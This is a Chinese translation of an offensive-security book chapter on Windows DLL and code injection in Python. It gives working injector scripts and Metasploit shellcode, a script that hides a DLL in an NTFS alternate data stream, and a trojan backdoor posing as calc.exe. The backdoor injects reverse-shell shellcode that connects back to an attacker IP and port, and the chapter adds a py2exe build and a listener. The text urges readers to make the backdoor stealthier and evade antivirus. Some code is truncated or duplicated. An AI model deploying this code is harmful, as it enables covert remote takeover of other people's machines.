# 七、Dll 和代码注入

# 7 Dll 和代码注入

有时候在执行逆向工程或者攻击特定程序的时候，将代码 加载进目标进程，并在进程内执行是非常有用的。这类技术一般 被称为注入，常用于偷取密码或者获得远程桌面的控制权。注入主要分为 DLL 和代码注入两种，我们将用 Python 结合这两种技术创建一些简单的应用程序。为将来开发，exploit 编写，shellcode 和安全 测试做准备。接下来要实现的任务就是，用 DLL 注入在目标进程内运行一个窗口，用代码注入将 shellcode 注入目标进程，让 shellcode 杀死进程。最后我们将用纯 Python 实现一个后门。在实现的过程中将大量的用到代码注入，和一些黑色技巧。让我们先从创建远线程开始， 这是注入的基础。

# 7.1 创建远线程

## 7.1 创建远线程

两种注入虽然在基础原理上不同，但是实现的方法差不多：创建远线程。这由 CreateRemoteThread()完成，同样由由 kernel32.dll 导出。原型如下:

```py
HANDLE WINAPI CreateRemoteThread( 
    HANDLE hProcess,
    LPSECURITY_ATTRIBUTES lpThreadAttributes, 
    SIZE_T dwStackSize, 
    LPTHREAD_START_ROUTINE lpStartAddress, 
    LPVOID lpParameter,
    DWORD dwCreationFlags, 
    LPDWORD lpThreadId
); 
```

别被这么多参数吓着，它们很多通过名字就能知道什么用。第一个参数，hProcess 就是 将要注入的目标进程的句柄。lpThreadAttributes 参数就是创建的线程的安全描述符，其中 的数值决定了线程是否能被子进程继承。在这里只要简单的设置成 NULL，将会得到一个不 能继承的线程句柄，和一个默认的安全描述符。 dwStackSize 参数表示新线程的栈大小，在 这里简单的设置成 0，表示设置成进程默认的大小。下一次参数是最重要的： lpStartAddress， 也就是新线程要执行的代码在内存中的哪个位置。lpParameter 和上一个参数一样重要，不 过 提 供 的 是 一 个 指 针 ， 指 向 一 块 内 存 区 域 ， 里 头 的 数 据 就 是 传 递 给 新 线 程 的 参 数 。 dwCreationFlags 决定了线程如何开始。这里我们设置成 0，表示在线程创建后立即执行。更 多详细的介绍看 MSDN。最后一个参数 lpThreadId 在线程创建成功后填充为新线程的 ID。 知道了参数的作用，让我们看看如何将 DLL 注入到目标进程，以及 shellcode 的注入。

两种远线程创建，有些许的不同，所以分开来说。

### 7.1.1 DLL 注入

DLL 注入是亦正亦邪的技术。从 Windows 的 shell 扩展到病毒的偷取技术，处处都能见到它们。甚至安全软件也会通过将 DLL 注入进程以监视进程的行为。DLL 确实很好用，因 为它们不仅能够将它编译为二进制，还能加载到目标进程，使它成为目标进程的一部分。这 非常有用，比如绕过软件防火墙的限制（它们通常只让特定的进程与外界联系，比如 IE）。 接下来让我们用 Python 写一个 DLL 注入脚本，实现将 DLL 注入指定的任何进程。

在一个进程里载入 DLL 需要使用 LoadLibrary()函数（由 kernel32.dll 导出）。函数原型 如下：

```py
HMODULE LoadLibrary( 
    LPCTSTR lpFileName
); 
```

lpFileName 参数为 DLL 的路径。我们需要让目标调用 LoadLibraryA 加载我们的 DLL。 首先解析出 LoadLibraryA 在内存中的地址，然后将 DLL 路径传入。实际操作就是使用 CreateRemoteThread()，lpStartAddress 指向 LoadLibraryA 的地址，lpParameter 指向 DLL 路 径。当 CreateRemoteThread()执行成功，就像目标进程自己调用 LoadLibraryA 加载了我们的 DLL。

DLL 注入测试的源码，可从 [`www.nostarch.com/ghpython.htm`](http://www.nostarch.com/ghpython.htm) 下载。

```py
#dll_injector.py
import sys
from ctypes import * 
PAGE_READWRITE = 0x04
PROCESS_ALL_ACCESS = ( 0x000F0000 | 0x00100000 | 0xFFF ) 
VIRTUAL_MEM = ( 0x1000 | 0x2000 )
kernel32 = windll.kernel32 
pid = sys.argv[1] 
dll_path = sys.argv[2] 
dll_len = len(dll_path)
# Get a handle to the process we are injecting into.
h_process = kernel32.OpenProcess( PROCESS_ALL_ACCESS, False, int(pid) ) 
if not h_process:
    print "[*] Couldn't acquire a handle to PID: %s" % pid 
    sys.exit(0)
# Allocate some space for the DLL path
arg_address = kernel32.VirtualAllocEx(h_process, 0, dll_len, VIRTUAL_ME PAGE_READWRITE)
# Write the DLL path into the allocated space 
written = c_int(0)
kernel32.WriteProcessMemory(h_process, arg_address, dll_path, dll_len, byref(written))
# We need to resolve the address for LoadLibraryA 
h_kernel32 = kernel32.GetModuleHandleA("kernel32.dll")
h_loadlib = kernel32.GetProcAddress(h_kernel32,"LoadLibraryA")
# Now we try to create the remote thread, with the entry point set
# to LoadLibraryA and a pointer to the DLL path as its single parameter thread_id = c_ulong(0)
if not kernel32.CreateRemoteThread(h_process,
                                    None, 0,
                                    h_loadlib, arg_address, 0,
                                    byref(thread_id)): 
    print "[*] Failed to inject the DLL. Exiting."
    sys.exit(0)
print "[*] Remote thread with ID 0x%08x created." % thread_id.value 
```

第一步，在目标进程内申请足够的空间，用于存储 DLL 的路径。第二步，将 DLL 路径 写入申请好的地址。第三步，解析 LoadLibraryA 的内存地址。最后一步，将目标进程句柄 和 LoadLibraryA 地址还有存储 DLL 路径的内存地址，传入 CreateRemoteThread()。一旦， 线程创建成功就会看到弹出一个窗口。

现在我们已经成功的完成了 DLL 注入。是让弹出窗口优点虎头蛇尾。但是这对于我们 明白注入的使用，非常重要。

### 7.1.2 代码注入

让我们再狡猾点，再黑点。代码注入能够将 shellcode 注入到一个运行的进程，立即执 行，不会在硬盘上留下任何东西。同样也能将一个进程的 shell 迁移到另一个进程。

接下来我们将用一个简短的 shellcode（能终止指定 PID 的进程）注入到目标进程，然 后杀掉目标进程，同时不留任何痕迹。这对于我们本章最后要创建的后门是至关重要的一步。 同样，我们还要演示如何安全的替换 shellcode，以适用更多的不同的任务。

可以通过 Metasploit 的主页获得终止进程的 shellcode，它们的 shellcode 生成器非常好 用。如果之前没用过的，直接访问 [`metasploit.com/shellcode/`](http://metasploit.com/shellcode/)。这次我们使用 Windows Execute Command shellcode 生成器。创建的 shellcdoe 如表 7-1。

```py
/* win32_exec - EXITFUNC=thread CMD=taskkill /PID AAAAAAAA Size=152 Encoder=None http://metasploit.com*/
unsigned char scode[] = 
    "\xfc\xe8\x44\x00\x00\x00\x8b\x45\x3c\x8b\x7c\x05\x78\x01\xef\x8b" 
    "\x4f\x18\x8b\x5f\x20\x01\xeb\x49\x8b\x34\x8b\x01\xee\x31\xc0\x99" 
    "\xac\x84\xc0\x74\x07\xc1\xca\x0d\x01\xc2\xeb\xf4\x3b\x54\x24\x04" 
    "\x75\xe5\x8b\x5f\x24\x01\xeb\x66\x8b\x0c\x4b\x8b\x5f\x1c\x01\xeb" 
    "\x8b\x1c\x8b\x01\xeb\x89\x5c\x24\x04\xc3\x31\xc0\x64\x8b\x40\x30" 
    "\x85\xc0\x78\x0c\x8b\x40\x0c\x8b\x70\x1c\xad\x8b\x68\x08\xeb\x09"
    "\x8b\x80\xb0\x00\x00\x00\x8b\x68\x3c\x5f\x31\xf6\x60\x56\x89\xf8" 
    "\x83\xc0\x7b\x50\x68\xef\xce\xe0\x60\x68\x98\xfe\x8a\x0e\x57\xff" 
    "\xe7\x74\x61\x73\x6b\x6b\x69\x6c\x6c\x20\x2f\x50\x49\x44\x20\x41" 
    "\x41\x41\x41\x41\x41\x41\x41\x00"; 
```

Listing 7-1:由 Metasploit 产生的 Process-killing shellcode

生成的 shellcode 的时候记得选中 Restricted Characters 文本框以清除 0x00 字节，同时 Encoder 框设置成默认编码。在 shellcode 的最后一行你看到了重复的 8 个\x41。为什么是 8 个大小的 A？因为，后面我们要动态的指定 PID(需要被杀掉的进程)的时候，只要把 8 个\x41 替换成 PID 的数值就行了，剩下的位置用\x00 替换。如果之前生成的时候对 shellcode 进行 了编码，那后面的这 8 个 A 也会被编码，到时候你就会非常痛苦，根本找不出来替换的地 方。

现在我们有了自己的 shellcode，是时候回来进行实际的 code injection 工作了。

```py
#code_injector.py
import sys
from ctypes import *
# We set the EXECUTE access mask so that our shellcode will
# execute in the memory block we have allocated 
PAGE_EXECUTE_READWRITE = 0x00000040 
PROCESS_ALL_ACCESS = ( 0x000F0000 | 0x00100000 | 0xFFF ) 
VIRTUAL_MEM = ( 0x1000 | 0x2000 )
kernel32 = windll.kernel32
pid = int(sys.argv[1]) 
pid_to_kill = sys.argv[2]
if not sys.argv[1] or not sys.argv[2]:
    print "Code Injector: ./code_injector.py <PID to inject> <PID to Kil sys.exit(0)
#/* win32_exec - EXITFUNC=thread CMD=cmd.exe /c taskkill /PID AAAA
#Size=159 Encoder=None http://metasploit.com */ 
shellcode = \
    "\xfc\xe8\x44\x00\x00\x00\x8b\x45\x3c\x8b\x7c\x05\x78\x01\xef\x8b" \ 
    "\x4f\x18\x8b\x5f\x20\x01\xeb\x49\x8b\x34\x8b\x01\xee\x31\xc0\x99" \ 
    "\xac\x84\xc0\x74\x07\xc1\xca\x0d\x01\xc2\xeb\xf4\x3b\x54\x24\x04" \ 
    "\x75\xe5\x8b\x5f\x24\x01\xeb\x66\x8b\x0c\x4b\x8b\x5f\x1c\x01\xeb" \ 
    "\x8b\x1c\x8b\x01\xeb\x89\x5c\x24\x04\xc3\x31\xc0\x64\x8b\x40\x30" \ 
    "\x85\xc0\x78\x0c\x8b\x40\x0c\x8b\x70\x1c\xad\x8b\x68\x08\xeb\x09" \ 
    "\x8b\x80\xb0\x00\x00\x00\x8b\x68\x3c\x5f\x31\xf6\x60\x56\x89\xf8" \ 
    "\x83\xc0\x7b\x50\x68\xef\xce\xe0\x60\x68\x98\xfe\x8a\x0e\x57\xff" \ 
    "\xe7\x63\x6d\x64\x2e\x65\x78\x65\x20\x2f\x63\x20\x74\x61\x73\x6b" \
    "\x6b\x69\x6c\x6c\x20\x2f\x50\x49\x44\x20\x41\x41\x41\x41\x00" 
padding = 4 - (len( pid_to_kill ))
replace_value = pid_to_kill + ( "\x00" * padding ) 
replace_string= "\x41" * 4
shellcode = shellcode.replace( replace_string, replace_value ) 
code_size = len(shellcode)
# Get a handle to the process we are injecting into.
h_process = kernel32.OpenProcess( PROCESS_ALL_ACCESS, False, int(pid) ) 
if not h_process:
    print "[*] Couldn't acquire a handle to PID: %s" % pid 
```

```py
# code_injector.py 
import sys
from ctypes import *
# We set the EXECUTE access mask so that our shellcode will
# execute in the memory block we have allocated 
PAGE_EXECUTE_READWRITE = 0x00000040 
PROCESS_ALL_ACCESS = ( 0x000F0000 | 0x00100000 | 0xFFF ) 
VIRTUAL_MEM = ( 0x1000 | 0x2000 )
kernel32 = windll.kernel32
pid = int(sys.argv[1]) 
pid_to_kill = sys.argv[2]
if not sys.argv[1] or not sys.argv[2]:
    print "Code Injector: ./code_injector.py <PID to inject> <PID to Kil 
    sys.exit(0)
#/* win32_exec - EXITFUNC=thread CMD=cmd.exe /c taskkill /PID AAAA
#Size=159 Encoder=None http://metasploit.com */ 
shellcode = \
    "\xfc\xe8\x44\x00\x00\x00\x8b\x45\x3c\x8b\x7c\x05\x78\x01\xef\x8b" \ 
    "\x4f\x18\x8b\x5f\x20\x01\xeb\x49\x8b\x34\x8b\x01\xee\x31\xc0\x99" \ 
    "\xac\x84\xc0\x74\x07\xc1\xca\x0d\x01\xc2\xeb\xf4\x3b\x54\x24\x04" \ 
    "\x75\xe5\x8b\x5f\x24\x01\xeb\x66\x8b\x0c\x4b\x8b\x5f\x1c\x01\xeb" \ 
    "\x8b\x1c\x8b\x01\xeb\x89\x5c\x24\x04\xc3\x31\xc0\x64\x8b\x40\x30" \ 
    "\x85\xc0\x78\x0c\x8b\x40\x0c\x8b\x70\x1c\xad\x8b\x68\x08\xeb\x09" \ 
    "\x8b\x80\xb0\x00\x00\x00\x8b\x68\x3c\x5f\x31\xf6\x60\x56\x89\xf8" \ 
    "\x83\xc0\x7b\x50\x68\xef\xce\xe0\x60\x68\x98\xfe\x8a\x0e\x57\xff" \ 
    "\xe7\x63\x6d\x64\x2e\x65\x78\x65\x20\x2f\x63\x20\x74\x61\x73\x6b" \ 
    "\x6b\x69\x6c\x6c\x20\x2f\x50\x49\x44\x20\x41\x41\x41\x41\x00" 
padding = 4 - (len( pid_to_kill ))
replace_value = pid_to_kill + ( "\x00" * padding ) 
replace_string= "\x41" * 4
shellcode = shellcode.replace( replace_string, replace_value ) 
code_size = len(shellcode)
# Get a handle to the process we are injecting into.
h_process = kernel32.OpenProcess( PROCESS_ALL_ACCESS, False, int(pid) ) 
if not h_process:
    print "[*] Couldn't acquire a handle to PID: %s" % pid 
    sys.exit(0)
# Allocate some space for the shellcode
arg_address = kernel32.VirtualAllocEx(h_process, 0, code_size, VIRTUAL_MEM, PAGE_EXECUTE_READWRITE)
# Write out the shellcode 
written = c_int(0)
kernel32.WriteProcessMemory(h_process, arg_address, shellcode, code_size, byref(written))
# Now we create the remote thread and point its entry routine
# to be head of our shellcode 
thread_id = c_ulong(0)
if not kernel32.CreateRemoteThread(h_process,None,0,arg_address,None, 0,byref(thread_id)):
    print "[*] Failed to inject process-killing shellcode. Exiting." 
    sys.exit(0)
print "[*] Remote thread created with a thread ID of: 0x%08x" % thread_id.value
print "[*] Process %s should not be running anymore!" % pid_to_kill 
```

上面的代码大部分看起来都很熟悉，但是还是有些有趣的技巧的。第一个，替换 shellcode 成我们想终止的 PID 的字符串。另一个值得关注的地方，就是调用 CreateRemoteThread()时， lpStartAddress 指向存放 shellcode 的地址，而 lpParameter 设置为 NULL。因为我们不需要传 入任何参数，我们只是想创建新线程执行 shellcdoe。

脚本调用参数如下：

```py
./code_injector.py <PID to inject> <PID to kill> 
```

传入合适的参数，线程创建成功的话，就会返回线程 ID。目标进程被终止后，你会看 到 cmd.exe 进程也结束了。

现在你知道了如何从另一个进程加载和执行 shellcdoe。现在不仅迁移 shell 方便了，隐 藏踪迹也更方便了，因为没有任何代码出现在硬盘上。接下来把我们所学的结合起来，创建 一个可定制的后门，当目标机器上线的时候，就能获取远程访问的权限。

我们能更坏吗？能！

# 7.2 邪恶的代码

## 7.2 邪恶的代码

现在让我们本着学以致用的目的，用注入搞点好玩的东西。我们将创造一个后门程序， 将它命名为一个系统中正规的程序（比如 calc.exe）。只要用户执行了 calc.exe，我们的后门

就能获得系统的控制权。cacl.exe 执行后，就会在执行后门代码的同时，执行原先的 calc.exe （之前我们的后门命名成 calc.exe，将原来的 cacl.exe 移到别的地方）。当 cacl.exe 执行后， 通过注入，反弹一个 shell 到我们的机器上，最后我们再注入 kill 代码，杀死前面运行的程 序。

等一等！我们难道不能直接结束 calc.exe 吗？简单地说，可以。但是终止进程对于后门 来说是一项很关键的技术。比如，你能通过枚举进程，找出杀毒软件和防火墙的的进程，然 后简单的杀死。或者你也能，通过上一章学到的注入技术，在离开前杀死进程。技术不止一 种，选择合适的是最重要的。

最后我们还会介绍如何将 Python 脚本编译成一个单独的 Windows 可执行文件，以及如 何偷偷的加载 DLL。接下来先看看如何将 DLL 隐藏起来。

### 7.2.1 文件隐藏

我们的后门会做成 DLL 的形式，为了能够它安全点，得用一些秘密的方法将它藏起来。 我们能够用捆绑器，将两个文件（其中包括我们的 DLL）捆绑起来，不过 WE ARE Python Hacer,当然得有点不一样了。

OS 就是我们最好的老师，NTFS 同样提供了很多强大而隐秘的技巧，今天我们就用 alternate data streams (ADS)。从 Windows NT 3.1 开始就有了这项技术，目的是为了和苹果 的系统 Apple heirarchical file system (HFS)进行通讯。ADS 允许硬盘上的一个文件，能够 将 DLL 储存在它的流中，然后附加到主进程执行。流就是隐藏的文件，但是能够被附加到任 何在硬盘上能看得到的文件。

使用流隐藏的文件，不用特殊的工具是看不见的。目前很多安全工具也还不能很好的扫 描 ADS，所以用此逃避追捕是非常理想的。

在一个文件上使用 ADS，很简单，只要在文件名后附加双引号，接着跟上我们想隐藏 的文件。

```py
reverser.exe:vncdll.dll 
```

在 这 个 例 子 中 我 们 将 vncdll. dll 附 加 到 reverser.exe 中 。 下 面 写 个 简 单 的 脚 本 file_hider.py，就当的读取文件然后写入指定文件的 ADS。

```py
#file_hider.py import sys
# Read in the DLL
fd = open( sys.argv[1], "rb" ) 
dll_contents = fd.read() 
fd.close()
print "[*] Filesize: %d" % len( dll_contents )
# Now write it out to the ADS
fd = open( "%s:%s" % ( sys.argv[2], sys.argv[1] ), "wb" ) 
fd.write( dll_contents )
fd.close() 
```

很简单，第一个传入的参数就是我们想隐藏的 DLL，第二参数就是目标文件。用这个 工具我们就能够很方便的，通过写入流的方式，将我们的文件和目标文件结合在一起。

### 7.2.2 编写后门

让我们构建我们的重定向代码，只要简单的启动指定名字的程序就行了。之所以叫执行 重定向，是因为我们将后门的名字命名为 calc.exe 了还将原来的 calc.exe 移动到了别的地方。 当用户测试执行计算器的时候，就会不经意的执行了我们的后门，后门程序通过重定向代码， 启动真正的计算器。用户会看不到任何邪恶的东西，依旧正常的使用计算器。下面的脚本引 用了第三章的 my_debugger_defines.py，其中包含了创建进程所需要的结构和常量。

```py
#backdoor.py
# This library is from Chapter 3 and contains all
# the necessary defines for process creation 
import sys
from ctypes import *
from my_debugger_defines import *
kernel32 = windll.kernel32 
PAGE_EXECUTE_READWRITE = 0x00000040 
PROCESS_ALL_ACCESS = ( 0x000F0000 | 0x00100000 | 0xFFF ) 
VIRTUAL_MEM = ( 0x1000 | 0x2000 )
# This is the original executable
path_to_exe = "C:\\calc.exe"
startupinfo = STARTUPINFO() 
process_information = PROCESS_INFORMATION() 
creation_flags = CREATE_NEW_CONSOLE 
startupinfo.dwFlags = 0x1
startupinfo.wShowWindow = 0x0 
startupinfo.cb = sizeof(startupinfo)
# First things first, fire up that second process
# and store its PID so that we can do our injection 
kernel32.CreateProcessA(path_to_exe,
    None, None, None, None,
    creation_flags, None,
    None, byref(startupinfo),
    byref(process_information)) 
pid = process_information.dwProcessId 
```

一样很简单，没有新代码。接下来让我们把注入的代码加到后门中。我们的注入函数能 够处理代码注入和 DLL 注入两种情况；parameter 标志设置为 1，data 变量包含 DLL 路径， 就能进行 DLL 注入，默认情况下 parameter 设置成 0，就是代码注入。跟黑的在后面。

```py
#backdoor.py
...
def inject( pid, data, parameter = 0 ):
    # Get a handle to the process we are injecting into.
    h_process = kernel32.OpenProcess( PROCESS_ALL_ACCESS, False, int(pid) ) 
    if not h_process:
        print "[*] Couldn't acquire a handle to PID: %s" % pid 
        sys.exit(0)
    arg_address = kernel32.VirtualAllocEx(h_process, 0, len(data), VIRTUAL_MEM, PAGE_EXECUTE_READWRITE)
    written = c_int(0)
    kernel32.WriteProcessMemory(h_process, arg_address, data, len(data), byref(written))
    thread_id = c_ulong(0) 
    if not parameter:
        start_address = arg_address
    else:
        h_kernel32 = kernel32.GetModuleHandleA("kernel32.dll") 
        start_address = kernel32.GetProcAddress(h_kernel32,"LoadLibra 
        parameter = arg_address
    if not kernel32.CreateRemoteThread(h_process,None, 0,start_address,parameter,0,byref(thread_id)):
        print "[*] Failed to inject the DLL. Exiting." 
        sys.exit(0)
    return True 
```

现在我们有了能够支持两种注入的代码。是时候将两段不同的 shellcode 注入真正的 cacl.exe 进程了，一个 shellcode 反弹 shell 给我们，另一个杀死后门进程。

```py
#backdoor.py
...
# Now we have to climb out of the process we are in
# and code inject our new process to kill ourselves
#/* win32_reverse - EXITFUNC=thread LHOST=192.168.244.1 LPORT=4444 
#Size=287 Encoder=None http://metasploit.com */
connect_back_shellcode = 
    "\xfc\x6a\xeb\x4d\xe8\xf9\xff\xff\xff\x60\x8b\x6c\x24\x24\x8b\x45" \ 
    "\x3c\x8b\x7c\x05\x78\x01\xef\x8b\x4f\x18\x8b\x5f\x20\x01\xeb\x49" \ 
    "\x8b\x34\x8b\x01\xee\x31\xc0\x99\xac\x84\xc0\x74\x07\xc1\xca\x0d" \ 
    "\x01\xc2\xeb\xf4\x3b\x54\x24\x28\x75\xe5\x8b\x5f\x24\x01\xeb\x66" \ 
    "\x8b\x0c\x4b\x8b\x5f\x1c\x01\xeb\x03\x2c\x8b\x89\x6c\x24\x1c\x61" \ 
    "\xc3\x31\xdb\x64\x8b\x43\x30\x8b\x40\x0c\x8b\x70\x1c\xad\x8b\x40" \ 
    "\x08\x5e\x68\x8e\x4e\x0e\xec\x50\xff\xd6\x66\x53\x66\x68\x33\x32" \ 
    "\x68\x77\x73\x32\x5f\x54\xff\xd0\x68\xcb\xed\xfc\x3b\x50\xff\xd6" \ 
    "\x5f\x89\xe5\x66\x81\xed\x08\x02\x55\x6a\x02\xff\xd0\x68\xd9\x09" \ 
    "\xf5\xad\x57\xff\xd6\x53\x53\x53\x53\x43\x53\x43\x53\xff\xd0\x68" \ 
    "\xc0\xa8\xf4\x01\x66\x68\x11\x5c\x66\x53\x89\xe1\x95\x68\xec\xf9" \ 
    "\xaa\x60\x57\xff\xd6\x6a\x10\x51\x55\xff\xd0\x66\x6a\x64\x66\x68" \ 
    "\x63\x6d\x6a\x50\x59\x29\xcc\x89\xe7\x6a\x44\x89\xe2\x31\xc0\xf3" \ 
    "\xaa\x95\x89\xfd\xfe\x42\x2d\xfe\x42\x2c\x8d\x7a\x38\xab\xab\xab" \ 
    "\x68\x72\xfe\xb3\x16\xff\x75\x28\xff\xd6\x5b\x57\x52\x51\x51\x51" \ 
    "\x6a\x01\x51\x51\x55\x51\xff\xd0\x68\xad\xd9\x05\xce\x53\xff\xd6" \
    "\x6a\xff\xff\x37\xff\xd0\x68\xe7\x79\xc6\x79\xff\x75\x04\xff\xd6" \ 
    "\xff\x77\xfc\xff\xd0\x68\xef\xce\xe0\x60\x53\xff\xd6\xff\xd0" 
inject( pid, connect_back_shellcode )
#/* win32_exec - EXITFUNC=thread CMD=cmd.exe /c taskkill /PID AAAA
#Size=159 Encoder=None http://metasploit.com */
our_pid = str( kernel32.GetCurrentProcessId() ) 
process_killer_shellcode = \
    "\xfc\xe8\x44\x00\x00\x00\x8b\x45\x3c\x8b\x7c\x05\x78\x01\xef\x8b" \ 
    "\x4f\x18\x8b\x5f\x20\x01\xeb\x49\x8b\x34\x8b\x01\xee\x31\xc0\x99" \ 
    "\xac\x84\xc0\x74\x07\xc1\xca\x0d\x01\xc2\xeb\xf4\x3b\x54\x24\x04" \ 
    "\x75\xe5\x8b\x5f\x24\x01\xeb\x66\x8b\x0c\x4b\x8b\x5f\x1c\x01\xeb" \ 
    "\x8b\x1c\x8b\x01\xeb\x89\x5c\x24\x04\xc3\x31\xc0\x64\x8b\x40\x30" \ 
    "\x85\xc0\x78\x0c\x8b\x40\x0c\x8b\x70\x1c\xad\x8b\x68\x08\xeb\x09" \ 
    "\x8b\x80\xb0\x00\x00\x00\x8b\x68\x3c\x5f\x31\xf6\x60\x56\x89\xf8" \ 
    "\x83\xc0\x7b\x50\x68\xef\xce\xe0\x60\x68\x98\xfe\x8a\x0e\x57\xff" \ 
    "\xe7\x63\x6d\x64\x2e\x65\x78\x65\x20\x2f\x63\x20\x74\x61\x73\x6b" \ 
    "\x6b\x69\x6c\x6c\x20\x2f\x50\x49\x44\x20\x41\x41\x41\x41\x00" 
padding = 4 - ( len( our_pid ) )
replace_value = our_pid + ( "\x00" * padding ) 
replace_string= "\x41" * 4 
process_killer_shellcode = process_killer_shellcode.replace( replace_string, replace_value )
# Pop the process killing shellcode in 
inject( our_pid, process_killer_shellcode ) 
```

All right!后门程序通计算器(系统的 cacl.exe 有按钮和数字在上面)的 PID，将 shellcode 注入到进程里，然后通过第二个 shellcode 自我了断。这个后门综合了很多不同的技术。每 次重要目标系统中有人运行了计算器（当然你能够改成别的服务级别的文件，随系统启动）， 我们就能够取得机器的控制权。接下来就是键盘记录，嗅探数据包，任何你想干的，都去干 吧!!! 但是在这我们还疏忽了一点，不是每台机器都安装了 Python，他们为什么不用 Linux 呢？如果这样估计我也不用翻译这本数了，哈！别担心，我们有 py2exe，它能把 py 文件转 换成 exe 文件。

### 7.2.3 py2exe

py2exe 是一个非常方便的 Python 库，能够将 Python 脚本编译成完全独立的 Windows 执行程序。记得在下面的操作都是基于 Windows 平台，Linux 平台内置 Python。py2exe 安 装完成后，你就能够在脚本中使用他们了。在这之前先看看调用它们。

```py
#setup.py
# Backdoor builder
from distutils.core import setup 
import py2exe 
setup(
    console=['backdoor.py'],
    options = {'py2exe':{'bundle_files':1}}, 
    zipfile = None,
) 
```

很好很简单。仔细看看我们传入 setup 的函数。第一个，console 是我们要编译的 Python 脚本。 options 和 zipfile 参数设置为需要打包的 Python DLL 和所有别的依赖的库。这样我 们的后门就能在任何没有安装 python 的 windlws 系统上使用了。确保 my_debugger_defines.py, backdoor.py, 和 setup.py 文件在相同的目录下。在命令行下输入以下命令，编译脚本。

```py
python setup.py py2exe 
```

在编译完成后，在目录下会看到多出两个目录，dist 和 build。在 dist 文件夹下可以找到 backdoor.exe。重命名为 calc.exe 拷贝到目标系统，并将目标系统的 calc.exe 从 C:\WINDOWS\system32\ 拷贝到别的 目录(比如 C:\ folder)。将我们的 calc.exe 复制到 C:\WINDOWS\system32\ 目录下。现在我们 还需要一个简单的 shell 接口，用来和反弹回来的 shell 交互，发送命令，接收结果。

```py
#backdoor_shell.py
import socket 
import sys
host = "192.168.244.1"
port = 4444
server = socket.socket( socket.AF_INET, socket.SOCK_STREAM ) 
server.bind( ( host, port ) )
server.listen( 5 )
print "[*] Server bound to %s:%d" % ( host , port ) 
#backdoor_shell.py
import socket 
import sys
host = "192.168.244.1"
port = 4444
server = socket.socket( socket.AF_INET, socket.SOCK_STREAM ) 
server.bind( ( host, port ) )
server.listen( 5 )
print "[*] Server bound to %s:%d" % ( host , port ) 
```

这是一个非常就当的 socket 服务器，仅仅是接受一个连接，然后处理一些基础的读写工 作。你可以修改 host 和 port 为自己需要的参数（比如 53， 80 ）。先运行服务器进行端口 监听，然后在远程的系统(本机也行)上运行 cacl.exe。你会看到弹出了计算器的窗口，同时 你的 Python shell 服务器也会接收到一个连接，开始读取数据。为了打断 recv 循环，请按下 CTRL-C 键，然后程序提示你输入命令。这时候就能做很多事情了，比如使用 WIndows shell 内建的命令，比如 dir，cd ，type。每个命令的输出结果都能够传输回来。现在你拥有了一 个高效的后门。用你的想象力扩展它，让它更猥琐，让它能逃过更多的杀毒的软件，更隐蔽。 我们的目标就是没有最坏，只有更坏。用 Python 的好处就是，快速，简单，可重用。

当你看完这章，你已经学会了 DLL 和代码注入这两种非常有用的技术。在今后的渗透 测试或者逆向工程中，你会发现花在这些技能上的精力是值得的。接下来我们会变得更黑， 我们要开始学习如何破坏程序。用 Python，用 Python-based fuzzer，用所有伟大的开源工具。